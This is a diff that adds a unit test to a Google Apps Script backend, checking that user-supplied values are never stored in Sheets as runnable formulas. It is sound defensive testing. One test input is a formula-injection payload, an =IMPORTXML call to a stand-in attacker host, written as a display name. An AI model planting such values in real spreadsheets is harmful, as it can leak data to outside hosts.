@@ -1070,6 +1070,37 @@ describe('GAS backend', () => {
       );
     });
 
+    it('never writes a cell that Sheets would run as a formula', () => {
+      // A display name comes from anyone who can reach the sign-up form.
+      rt.post({
+        action: 'register',
+        username: 'mallory',
+        displayName: '=IMPORTXML("http://evil.example","//x")',
+        passwordKey: key(9),
+      });
+      ok({
+        action: 'save',
+        session,
+        tables: {
+          brokers: [
+            { id: 'a', name: '=1+1', note: '+cmd' },
+            { id: 'b', name: '@x', note: '-2' },
+          ],
+        },
+      });
+      const formulaLike = [...rt.spreadsheets.values()]
+        .flatMap((ss) => [...ss.sheets.values()])
+        .flatMap((sheet) => sheet.cells.flat().map(String))
+        .filter((cell) => /^[=+\-@]/.test(cell));
+      expect(formulaLike).toEqual([]);
+      // The stored rows themselves are unchanged.
+      expect(ok({ action: 'load', session }).tables.brokers[0]).toEqual({
+        id: 'a',
+        name: '=1+1',
+        note: '+cmd',
+      });
+    });
+
     it('rejects a stale revision and leaves data untouched', () => {
       ok({
         action: 'save',
